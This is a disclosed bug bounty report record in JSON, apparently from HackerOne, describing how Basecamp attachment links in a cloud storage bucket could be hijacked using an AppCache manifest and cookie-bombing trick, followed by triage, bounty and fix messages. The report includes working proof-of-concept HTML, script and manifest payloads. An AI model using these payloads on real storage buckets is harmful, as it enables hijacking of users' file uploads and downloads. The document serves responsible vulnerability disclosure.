{"id":403602,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM2MDI=","url":"https://hackerone.com/reports/403602","title":"Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-08-31T18:58:43.094Z","submitted_at":"2018-08-31T18:58:43.094Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hudmi","url":"/hudmi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-26T18:20:26.237Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-10-27T18:20:21.785Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. \n\nhttps://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com\u0026Expires=1535826443\u0026Signature=*sign*\u0026response-content-type=text/html\n\nSo with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. \nTo know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/\n\n##Reproduction steps\nTo upload the files:\n1. Login to 3.basecamp.com\n2. Open campfire of any project\n3. Upload target files \n4. Extract direct links of them to Google Storage and remove `response-content-disposition` param\n\nI have uploaded 3 files by this way:\n```\n\u003chtml manifest=\"[manifest_url]\"\u003e\nThis is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.\n\u003cscript\u003e\nsetTimeout(function(){\nfor(var i = 1e3; i\u003e0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};\n}, 3000);\n\u003c/script\u003e\n\u003c/html\u003e\n```\n```\nCACHE MANIFEST \n\nFALLBACK:\n/bc3_production_blobs/ [fallback_url]\n```\n```\n\u003chtml\u003e\n\u003cscript\u003e\nalert('Your request to the page '+location.href+' is hijacked!');\n\u003c/script\u003e\n\u003c/html\u003e\n```\n\n##PoC\nGo to http://â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.\nRefer to the video.\n\n## Impact\n\nDirect links to any attachments can be hijacked and confedential files can be compromised","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":340718,"file_name":"capture-132.avi","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/718/989c84f09b7b41f34c3abf7706899a8deee834d3/capture-132.avi?response-content-disposition=attachment%3B%20filename%3D%22capture-132.avi%22%3B%20filename%2A%3DUTF-8%27%27capture-132.avi\u0026response-content-type=video%2Fx-msvideo\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145628Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7a22ae613c8ef86b8f55f96b73a2053ecf7080a3765e1ea9fec034dbac403d82","file_size":595882,"type":"video/x-msvideo"}],"allow_singular_disclosure_at":"2020-11-26T18:20:21.890Z","allow_singular_disclosure_after":-27549366.595532976,"singular_disclosure_allowed":true,"vote_count":50,"voters":["xploiterr","mashoud1122","fqdn","bughunterninja","locs3c","bibekshah","hetroublemakr","taaminz","harry_mg","sodium_","and 40 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":4655,"asset_type":"URL","asset_identifier":"3.basecamp.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3276613,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2018-08-31T18:59:50.951Z","updated_at":"2018-08-31T18:59:50.951Z","additional_data":{"old_title":"Attachments can be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)","new_title":"Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)"},"actor":{"username":"hudmi","cleared":false,"url":"/hudmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3278897,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for this report, @hudmi! We'll have a look on Monday and will let you know. ","automated_response":false,"created_at":"2018-09-01T09:20:39.514Z","updated_at":"2018-09-01T09:20:39.514Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3281687,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you again for reporting this, great find. We confirmed the issue, so I'm moving this to Triaged. We're working on possible fixes. I'll follow up with a bounty within a week, and will let you know when we have a mitigation ready. \n\nThanks!","automated_response":false,"created_at":"2018-09-02T20:45:06.979Z","updated_at":"2018-09-02T20:45:06.979Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3281693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ok","automated_response":false,"created_at":"2018-09-02T20:48:29.403Z","updated_at":"2018-09-02T20:48:29.403Z","actor":{"username":"hudmi","cleared":false,"url":"/hudmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3303015,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @hudmi!\nWe are still working on a fix for this (it's not straightforward, but we are close), we'll let you know when it's ready. This vulnerability falls in our $500+ tier (without getting into the $1000+ tier), and we decided to award the top of that tier. It's a very clever attack ðŸ˜ƒ\n\nThank you!","automated_response":false,"created_at":"2018-09-06T19:48:55.076Z","updated_at":"2018-09-06T19:48:55.076Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Basecamp"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"hudmi","url":"/hudmi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3306933,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","automated_response":false,"created_at":"2018-09-07T10:54:59.687Z","updated_at":"2018-09-07T10:54:59.687Z","actor":{"username":"hudmi","cleared":false,"url":"/hudmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3472546,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hudmi!\n\nSorry for the wait while we worked on this, and thanks for your patience. In the end, this was significantly more laborious than we thought, mainly due to how Google Cloud Storage works and our implementation. Fortunately, we believe we have now mitigated this. Could you please verify whether you can still reproduce this kind of attack?\n\nThank you!","automated_response":false,"created_at":"2018-10-12T19:42:25.188Z","updated_at":"2018-10-12T19:42:25.188Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3476698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed","automated_response":false,"created_at":"2018-10-13T22:45:41.597Z","updated_at":"2018-10-13T22:45:41.597Z","actor":{"username":"hudmi","cleared":false,"url":"/hudmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3477461,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-10-14T08:24:33.708Z","updated_at":"2018-10-14T08:24:33.708Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":224092},"actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3477462,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you! ","automated_response":false,"created_at":"2018-10-14T08:24:42.883Z","updated_at":"2018-10-14T08:24:42.883Z","actor":{"username":"rosa","cleared":false,"url":"/rosa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"hudmi","url":"/hudmi"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9651371,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-27T18:20:21.809Z","updated_at":"2020-10-27T18:20:21.809Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9937162,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-26T18:20:26.296Z","updated_at":"2020-11-26T18:20:26.296Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Basecamp"}},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}